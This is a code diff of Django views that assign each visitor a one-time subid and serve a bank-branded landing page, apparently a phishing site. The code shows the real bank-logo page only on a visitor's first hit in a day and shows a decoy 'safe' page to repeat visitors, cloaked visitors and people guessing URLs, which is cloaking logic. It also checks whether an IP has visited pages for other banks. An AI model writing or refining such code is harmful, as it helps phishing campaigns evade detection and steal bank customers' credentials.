@@ -1,53 +1,67 @@
-# Create your views here.
-
-from django.shortcuts import render_to_response, HttpResponse, HttpResponseRedirect
-from django.conf import settings
-from .models import Keyword, LandingPage, Visitor
-from pygeoip import GeoIP, GeoIPError
 import datetime
 import urllib2
 import string, random
+
+from django.shortcuts import render_to_response, HttpResponse, HttpResponseRedirect, get_object_or_404
+from django.core.urlresolvers import reverse
+from django.conf import settings
+from pygeoip import GeoIP, GeoIPError
+
+from website.models import Keyword, LandingPage, Visitor
 
 geoip = GeoIP(settings.GEOIP_DB_PATH)
 
 
 def generate_subid():
     sequence = list(string.ascii_letters + string.digits)
-    random.shuffle(sequence)
-    return ''.join(sequence[:15])
 
-def get_landing_page(request, bank_keyword, lp='lp5'):
+    while True:
+        random.shuffle(sequence)
+        subid = ''.join(sequence[:15])
+
+        if not Visitor.objects.filter(text=subid).exists():
+            return subid
+
+
+def landing_page(request, keyword, lp='lp5'):
     subid = generate_subid()
-    v = save_visitor(request, bank_keyword, lp)
-    v.text = subid
-    v.save()
-    return HttpResponseRedirect('/s/%s/' % subid)
+    visitor = save_visitor(request, keyword, lp)
+    visitor.text = subid
+    visitor.save()
 
+    return HttpResponseRedirect(reverse('website.newviews.unique_subid', args=[subid,]))
 
 def unique_subid(request, subid):
-    #check db for this subid
-    try:
-        v = Visitor.objects.get(text=subid)
-    except Visitor.DoesNotExist: #Block this person he's guessing urls
-        return HttpResponse('page not found')
-    if v.hits > 1:
-        return render_to_response('%s/safe.html' % v.lp,locals())
-        #show real page since hits = 1. Default value for hits field is 1 in table
-    try:
-        bank = Keyword.objects.get(keyword=v.keyword)
-    except Keyword.DoesNotExist:
-        return HttpResponse('Bank not found in system')
-    logo = bank.image.url
-    if v.country_code in ['EG', 'NL']: #Allow Egypt and Netherlands always
-        v.cloaked = False
-        v.reason = ''
-    v.hits = v.hits + 1
-    v.save()
 
-    #    return render_to_response('%s/safe.html' % lp,locals())
-    if v.cloaked:
-        return render_to_response('%s/safe.html' % v.lp,locals())
-    return render_to_response('%s/index.html' % v.lp,locals())
+    visitor = get_object_or_404(Visitor, text=subid)
+
+    ip = request.META.get('HTTP_X_REAL_IP', '')
+    day_ago = datetime.datetime.now()-datetime.timedelta(days=1)
+
+    context = {
+        'v': visitor,
+        'logo': visitor.keyword.image.url,
+        'bank': visitor.keyword,
+    }
+
+    if visitor.visit_datetime > day_ago:
+        # One more visit, just showing safe page
+        return render_to_response('%s/safe.html' % visitor.lp, context)
+
+    else:
+        # First hit in a day
+        if visitor.country_code in ('EG', 'NL'):  # Allow Egypt and Netherlands always
+            visitor.cloaked = False
+            visitor.reason = ''
+        visitor.visit_datetime = datetime.datetime.now()  # Saving last access time
+
+    visitor.ip = ip
+    visitor.save()
+
+    if visitor.cloaked:
+        return render_to_response('%s/safe.html' % visitor.lp, context)
+
+    return render_to_response('%s/index.html' % visitor.lp, context)
 
 
 def ip_details(request):
@@ -88,7 +102,7 @@ def legitimate_visitor(ip, geo_data, v):
     dt = datetime.datetime.now() - datetime.timedelta(days=1)
     dt5 = datetime.datetime.now() - datetime.timedelta(days=5)
     number_of_visits = Visitor.objects.filter(ip=ip, visit_datetime__gte=dt5).exists()
-    another_bank = Visitor.objects.filter(ip=ip, visit_datetime__gte=dt5).exclude(keyword = v.keyword).exists()
+    another_bank = Visitor.objects.filter(ip=ip, visit_datetime__gte=dt5).exclude(keyword=v.keyword_id).exists()
     #    print(visits)
 
     if number_of_visits:
@@ -105,11 +119,12 @@ def legitimate_visitor(ip, geo_data, v):
     return ''
 
 
-def save_visitor(request, keyword, lp):
+def save_visitor(request, keyword_text, lp):
     v = Visitor()
     v.visit_datetime = datetime.datetime.now()
     v.ip = request.META.get('HTTP_X_REAL_IP', '')
     v.ua = request.META['HTTP_USER_AGENT'][:100]
+    keyword = get_object_or_404(Keyword, keyword=keyword_text)
     v.keyword = keyword
     v.lp = lp
     v.dt = datetime.datetime.now()
